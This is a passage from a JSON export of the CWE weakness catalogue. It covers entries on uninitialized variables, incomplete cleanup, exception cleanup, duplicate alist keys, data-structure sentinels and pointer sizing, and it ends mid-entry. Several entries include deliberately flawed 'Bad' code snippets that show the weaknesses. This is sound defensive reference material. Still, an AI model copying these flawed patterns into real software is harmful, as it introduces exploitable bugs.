          "Description": "Chain: sscanf() call is used to check if a username and group exists, but the return value of sscanf() call is not checked (CWE-252), causing an uninitialized variable to be checked (CWE-457), returning success to allow authorization bypass for executing a privileged (CWE-863).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2019-15900"
        },
        {
          "Reference": "CVE-2008-3688",
          "Description": "Chain: A denial of service may be caused by an uninitialized variable (CWE-457) allowing an infinite loop (CWE-835) resulting from a connection to an unresponsive server.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-3688"
        },
        {
          "Reference": "CVE-2008-0081",
          "Description": "Uninitialized variable leads to code execution in popular desktop application.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-0081"
        },
        {
          "Reference": "CVE-2007-4682",
          "Description": "Crafted input triggers dereference of an uninitialized object pointer.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-4682"
        },
        {
          "Reference": "CVE-2007-3468",
          "Description": "Crafted audio file triggers crash when an uninitialized variable is used.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-3468"
        },
        {
          "Reference": "CVE-2007-2728",
          "Description": "Uninitialized random seed variable used.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-2728"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CLASP",
          "EntryName": "Uninitialized variable"
        },
        {
          "TaxonomyName": "7 Pernicious Kingdoms",
          "EntryName": "Uninitialized Variable"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP1",
          "EntryName": "Glitch in computation"
        },
        {
          "TaxonomyName": "SEI CERT Perl Coding Standard",
          "EntryID": "DCL33-PL",
          "EntryName": "Declare identifiers before using them",
          "MappingFit": "Imprecise"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-18",
          "Authors": [
            "Secure Software, Inc."
          ],
          "Title": "The CLASP Application Security Process",
          "PublicationYear": "2005",
          "URL": "https://cwe.mitre.org/documents/sources/TheCLASPApplicationSecurityProcess.pdf"
        },
        {
          "ExternalReferenceID": "REF-436",
          "Authors": [
            "mercy"
          ],
          "Title": "Exploiting Uninitialized Data",
          "PublicationYear": "2006",
          "PublicationMonth": "01",
          "URL": "http://www.felinemenace.org/~mercy/papers/UBehavior/UBehavior.zip"
        },
        {
          "ExternalReferenceID": "REF-437",
          "Authors": [
            "Microsoft Security Vulnerability Research & Defense"
          ],
          "Title": "MS08-014 : The Case of the Uninitialized Stack Variable Vulnerability",
          "PublicationYear": "2008",
          "PublicationMonth": "03",
          "PublicationDay": "11",
          "URL": "https://msrc.microsoft.com/blog/2008/03/ms08-014-the-case-of-the-uninitialized-stack-variable-vulnerability/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-44",
          "Section": "\"Sin 8: C++ Catastrophes.\" Page 143",
          "Authors": [
            "Michael Howard",
            "David LeBlanc",
            "John Viega"
          ],
          "Title": "24 Deadly Sins of Software Security",
          "Publication": "McGraw-Hill",
          "PublicationYear": "2010"
        },
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 7, \"Variable Initialization\", Page 312",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "458",
      "Name": "DEPRECATED: Incorrect Initialization",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Deprecated",
      "Description": "This weakness has been deprecated because its name and description did not match. The description duplicated CWE-454, while the name suggested a more abstract initialization problem. Please refer to CWE-665 for the more abstract problem.",
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This CWE has been deprecated.",
        "Comments": "CWE-665 or its descendants may be appropriate.",
        "Reasons": [
          "Deprecated"
        ]
      }
    },
    {
      "ID": "459",
      "Name": "Incomplete Cleanup",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product does not properly \"clean up\" and remove temporary or supporting resources after they have been used.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "404",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "404",
          "ViewID": "1003",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "AlternateTerms": [
        {
          "Term": "Insufficient Cleanup"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other",
            "Confidentiality",
            "Integrity"
          ],
          "Impact": [
            "Other",
            "Read Application Data",
            "Modify Application Data",
            "DoS: Resource Consumption (Other)"
          ],
          "Note": "It is possible to overflow the number of temporary files because directories typically have limits on the number of files allowed. This could create a denial of service problem."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design",
            "Implementation"
          ],
          "Description": "Temporary files and other supporting resources should be deleted/released immediately after they are no longer needed."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "Stream resources in a Java application should be released in a finally block, otherwise an exception thrown before the call to close() would result in an unreleased I/O resource. In the example below, the close() method is called in the try block (incorrect)."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\ttry {\n\t\tInputStream is = new FileInputStream(path);\n\t\tbyte b[] = new byte[is.available()];\n\t\tis.read(b);\n\t\tis.close();\n\t} catch (Throwable t) {\n\t\tlog.error(\"Something bad happened: \" + t.getMessage());\n\t}\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2000-0552",
          "Description": "World-readable temporary file not deleted after use.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2000-0552"
        },
        {
          "Reference": "CVE-2005-2293",
          "Description": "Temporary file not deleted after use, leaking database usernames and passwords.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2293"
        },
        {
          "Reference": "CVE-2002-0788",
          "Description": "Interaction error creates a temporary file that can not be deleted due to strong permissions.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-0788"
        },
        {
          "Reference": "CVE-2002-2066",
          "Description": "Alternate data streams for NTFS files are not cleared when files are wiped (alternate channel / infoleak).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-2066"
        },
        {
          "Reference": "CVE-2002-2067",
          "Description": "Alternate data streams for NTFS files are not cleared when files are wiped (alternate channel / infoleak).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-2067"
        },
        {
          "Reference": "CVE-2002-2068",
          "Description": "Alternate data streams for NTFS files are not cleared when files are wiped (alternate channel / infoleak).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-2068"
        },
        {
          "Reference": "CVE-2002-2069",
          "Description": "Alternate data streams for NTFS files are not cleared when files are wiped (alternate channel / infoleak).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-2069"
        },
        {
          "Reference": "CVE-2002-2070",
          "Description": "Alternate data streams for NTFS files are not cleared when files are wiped (alternate channel / infoleak).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-2070"
        },
        {
          "Reference": "CVE-2005-1744",
          "Description": "Users not logged out when application is restarted after security-relevant changes were made.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1744"
        }
      ],
      "FunctionalAreas": [
        "File Processing"
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "PLOVER",
          "EntryName": "Incomplete Cleanup"
        },
        {
          "TaxonomyName": "OWASP Top Ten 2004",
          "EntryID": "A10",
          "EntryName": "Insecure Configuration Management",
          "MappingFit": "CWE More Specific"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "FIO42-C",
          "EntryName": "Close files when they are no longer needed",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "MEM31-C",
          "EntryName": "Free dynamically allocated memory when no longer needed",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "FIO04-J",
          "EntryName": "Release resources when they are no longer needed"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "FIO00-J",
          "EntryName": "Do not operate on files in shared directories"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP14",
          "EntryName": "Failure to release resource"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Relationship",
          "Note": "CWE-459 is a child of CWE-404 because, while CWE-404 covers any type of improper shutdown or release of a resource, CWE-459 deals specifically with a multi-step shutdown process in which a crucial step for \"proper\" cleanup is omitted or impossible. That is, CWE-459 deals specifically with a cleanup or shutdown process that does not successfully remove all potentially sensitive data."
        },
        {
          "Type": "Relationship",
          "Note": "Overlaps other categories such as permissions and containment. Concept needs further development. This could be primary (e.g. leading to infoleak) or resultant (e.g. resulting from unhandled error conditions or early termination)."
        }
      ]
    },
    {
      "ID": "460",
      "Name": "Improper Cleanup on Thrown Exception",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product does not clean up its state or incorrectly cleans up its state when an exception is thrown, leading to unexpected state or control flow.",
      "ExtendedDescription": "Often, when functions or loops become complicated, some level of resource cleanup is needed throughout execution. Exceptions can disturb the flow of the code and prevent the necessary cleanup from happening.",
      "LikelihoodOfExploit": "Medium",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "459",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "755",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C#",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Varies by Context"
          ],
          "Note": "The code could be left in a bad state."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "If one breaks from a loop or function by throwing an exception, make sure that cleanup happens or that you should exit the program. Use throwing exceptions sparsely."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following example demonstrates the weakness."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class foo {\n\t\t\tpublic static final void main( String args[] ) {\n\t\t\t\t\tboolean returnValue;\n\t\t\t\t\treturnValue=doStuff();\n\t\t\t}\n\t\t\tpublic static final boolean doStuff( ) {\n\t\t\t\t\tboolean threadLock;\n\t\t\t\t\tboolean truthvalue=true;\n\t\t\t\t\ttry {\n\t\t\t\t\t\t\twhile(\n```\n//check some condition* \n\t\t\t\t\t\t\t) {\n\t\t\t\t\t\t\t```\n\t\t\t\t\t\t\t\t\tthreadLock=true; //do some stuff to truthvalue\n\t\t\t\t\t\t\t\t\tthreadLock=false;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tcatch (Exception e){\n\t\t\t\t\t\t\tSystem.err.println(\"You did something bad\");\n\t\t\t\t\t\t\tif (something) return truthvalue;\n\t\t\t\t\t}\n\t\t\t\t\treturn truthvalue;\n\t\t\t}\n\t}\n```"
            },
            {
              "BodyText": "In this case, a thread might be left locked accidentally."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CLASP",
          "EntryName": "Improper cleanup on thrown exception"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "ERR03-J",
          "EntryName": "Restore prior object state on method failure"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "ERR05-J",
          "EntryName": "Do not let checked exceptions escape from a finally block"
        },
        {
          "TaxonomyName": "SEI CERT Perl Coding Standard",
          "EntryID": "EXP31-PL",
          "EntryName": "Do not suppress or ignore exceptions",
          "MappingFit": "Imprecise"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-18",
          "Authors": [
            "Secure Software, Inc."
          ],
          "Title": "The CLASP Application Security Process",
          "PublicationYear": "2005",
          "URL": "https://cwe.mitre.org/documents/sources/TheCLASPApplicationSecurityProcess.pdf"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "462",
      "Name": "Duplicate Key in Associative List (Alist)",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "Duplicate keys in associative lists can lead to non-unique keys being mistaken for an error.",
      "ExtendedDescription": "A duplicate key entry -- if the alist is designed properly -- could be used as a constant time replace function. However, duplicate key entries could be inserted by mistake. Because of this ambiguity, duplicate key entries in an association list are not recommended and should not be allowed.",
      "LikelihoodOfExploit": "Low",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "694",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C#",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Quality Degradation",
            "Varies by Context"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Use a hash table instead of an alist."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Use an alist which checks the uniqueness of hash keys with each entry before inserting the entry."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following code adds data to a list and then attempts to sort the data."
            },
            {
              "Nature": "Bad",
              "Language": "Python",
              "ExampleCode": "```\n\talist = []\n\twhile (foo()): #now assume there is a string data with a key basename\n\t\tqueue.append(basename,data)\n\t\tqueue.sort()\n```"
            },
            {
              "BodyText": "Since basename is not necessarily unique, this may not sort how one would like it to be."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CLASP",
          "EntryName": "Duplicate key in associative list (alist)"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "ENV02-C",
          "EntryName": "Beware of multiple environment variables with the same effective name"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-18",
          "Authors": [
            "Secure Software, Inc."
          ],
          "Title": "The CLASP Application Security Process",
          "PublicationYear": "2005",
          "URL": "https://cwe.mitre.org/documents/sources/TheCLASPApplicationSecurityProcess.pdf"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "463",
      "Name": "Deletion of Data Structure Sentinel",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The accidental deletion of a data-structure sentinel can cause serious programming logic problems.",
      "ExtendedDescription": "Often times data-structure sentinels are used to mark structure of the data structure. A common example of this is the null character at the end of strings. Another common example is linked lists which may contain a sentinel to mark the end of the list. It is dangerous to allow this type of control data to be easily accessible. Therefore, it is important to protect from the deletion or modification outside of some wrapper interface which provides safety.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "707",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "PeerOf",
          "CweID": "464",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Availability",
            "Other"
          ],
          "Impact": [
            "Other"
          ],
          "Note": "Generally this error will cause the data structure to not work properly."
        },
        {
          "Scope": [
            "Authorization",
            "Other"
          ],
          "Impact": [
            "Other"
          ],
          "Note": "If a control character, such as NULL is removed, one may cause resource access control problems."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Use an abstraction library to abstract away risky APIs. Not a complete solution."
        },
        {
          "MitigationID": "MIT-10",
          "Phase": [
            "Build and Compilation"
          ],
          "Strategy": "Compilation or Build Hardening",
          "Description": "\n\nRun or compile the software using features or extensions that automatically provide a protection mechanism that mitigates or eliminates buffer overflows.\n\n\nFor example, certain compilers and extensions provide automatic buffer overflow detection mechanisms that are built into the compiled code. Examples include the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice.\n",
          "Effectiveness": "Defense in Depth",
          "EffectivenessNotes": "This is not necessarily a complete solution, since these mechanisms can only detect certain types of overflows. In addition, an attack could still cause a denial of service, since the typical response is to exit the application."
        },
        {
          "Phase": [
            "Operation"
          ],
          "Description": "Use OS-level preventative functionality. Not a complete solution."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "This example creates a null terminated string and prints it contents."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tchar *foo;\n\tint counter;\n\tfoo=calloc(sizeof(char)*10);\n\tfor (counter=0;counter!=10;counter++) {\n\t\tfoo[counter]='a';\n\tprintf(\"%s\\n\",foo);\n\t}\n```"
            },
            {
              "BodyText": "The string foo has space for 9 characters and a null terminator, but 10 characters are written to it. As a result, the string foo is not null terminated and calling printf() on it will have unpredictable and possibly dangerous results."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CLASP",
          "EntryName": "Deletion of data-structure sentinel"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-18",
          "Authors": [
            "Secure Software, Inc."
          ],
          "Title": "The CLASP Application Security Process",
          "PublicationYear": "2005",
          "URL": "https://cwe.mitre.org/documents/sources/TheCLASPApplicationSecurityProcess.pdf"
        },
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 8, \"NUL-Termination Problems\", Page 452",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "464",
      "Name": "Addition of Data Structure Sentinel",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The accidental addition of a data-structure sentinel can cause serious programming logic problems.",
      "ExtendedDescription": "Data-structure sentinels are often used to mark the structure of data. A common example of this is the null character at the end of strings or a special sentinel to mark the end of a linked list. It is dangerous to allow this type of control data to be easily accessible. Therefore, it is important to protect from the addition or modification of sentinels.",
      "LikelihoodOfExploit": "High",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "138",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Modify Application Data"
          ],
          "Note": "Generally this error will cause the data structure to not work properly by truncating the data."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation",
            "Architecture and Design"
          ],
          "Description": "Encapsulate the user from interacting with data sentinels. Validate user input to verify that sentinels are not present."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Proper error checking can reduce the risk of inadvertently introducing sentinel values into data. For example, if a parsing function fails or encounters an error, it might return a value that is the same as the sentinel."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Use an abstraction library to abstract away risky APIs. This is not a complete solution."
        },
        {
          "Phase": [
            "Operation"
          ],
          "Description": "Use OS-level preventative functionality. This is not a complete solution."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following example assigns some character values to a list of characters and prints them each individually, and then as a string. The third character value is intended to be an integer taken from user input and converted to an int."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tchar *foo;\n\tfoo=malloc(sizeof(char)*5);\n\tfoo[0]='a';\n\tfoo[1]='a';\n\tfoo[2]=atoi(getc(stdin));\n\tfoo[3]='c';\n\tfoo[4]='\\0'\n\tprintf(\"%c %c %c %c %c \\n\",foo[0],foo[1],foo[2],foo[3],foo[4]);\n\tprintf(\"%s\\n\",foo);\n```"
            },
            {
              "BodyText": "The first print statement will print each character separated by a space. However, if a non-integer is read from stdin by getc, then atoi will not make a conversion and return 0. When foo is printed as a string, the 0 at character foo[2] will act as a NULL terminator and foo[3] will never be printed."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CLASP",
          "EntryName": "Addition of data-structure sentinel"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "STR03-C",
          "EntryName": "Do not inadvertently truncate a null-terminated byte string"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "STR06-C",
          "EntryName": "Do not assume that strtok() leaves the parse string unchanged"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-18",
          "Authors": [
            "Secure Software, Inc."
          ],
          "Title": "The CLASP Application Security Process",
          "PublicationYear": "2005",
          "URL": "https://cwe.mitre.org/documents/sources/TheCLASPApplicationSecurityProcess.pdf"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "466",
      "Name": "Return of Pointer Value Outside of Expected Range",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "A function can return a pointer to memory that is outside of the buffer that the pointer is expected to reference.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "119",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "20",
          "ViewID": "700",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity"
          ],
          "Impact": [
            "Read Memory",
            "Modify Memory"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "7 Pernicious Kingdoms",
          "EntryName": "Illegal Pointer Value"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP1",
          "EntryName": "Glitch in computation"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-6",
          "Authors": [
            "Katrina Tsipenyuk",
            "Brian Chess",
            "Gary McGraw"
          ],
          "Title": "Seven Pernicious Kingdoms: A Taxonomy of Software Security Errors",
          "Publication": "NIST Workshop on Software Security Assurance Tools Techniques and Metrics",
          "PublicationYear": "2005",
          "PublicationMonth": "11",
          "PublicationDay": "07",
          "Publisher": "NIST",
          "URL": "https://samate.nist.gov/SSATTM_Content/papers/Seven%20Pernicious%20Kingdoms%20-%20Taxonomy%20of%20Sw%20Security%20Errors%20-%20Tsipenyuk%20-%20Chess%20-%20McGraw.pdf"
        },
        {
          "ExternalReferenceID": "REF-44",
          "Section": "\"Sin 5: Buffer Overruns.\" Page 89",
          "Authors": [
            "Michael Howard",
            "David LeBlanc",
            "John Viega"
          ],
          "Title": "24 Deadly Sins of Software Security",
          "Publication": "McGraw-Hill",
          "PublicationYear": "2010"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "This entry should have a chaining relationship with CWE-119 instead of a parent / child relationship, however the focus of this weakness does not map cleanly to any existing entries in CWE. A new parent is being considered which covers the more generic problem of incorrect return values. There is also an abstract relationship to weaknesses in which one component sends incorrect messages to another component; in this case, one routine is sending an incorrect value to another."
        }
      ]
    },
    {
      "ID": "467",
      "Name": "Use of sizeof() on a Pointer Type",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The code calls sizeof() on a malloced pointer type, which always returns the wordsize/8. This can produce an unexpected result if the programmer intended to determine how much memory has been allocated.",
      "ExtendedDescription": "The use of sizeof() on a pointer can sometimes generate useful information. An obvious case is to find out the wordsize on a platform. More often than not, the appearance of sizeof(pointer) indicates a bug.",
      "LikelihoodOfExploit": "High",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "131",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Confidentiality"
          ],
          "Impact": [
            "Modify Memory",
            "Read Memory"
          ],
          "Note": "This error can often cause one to allocate a buffer that is much smaller than what is needed, leading to resultant weaknesses such as buffer overflows."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
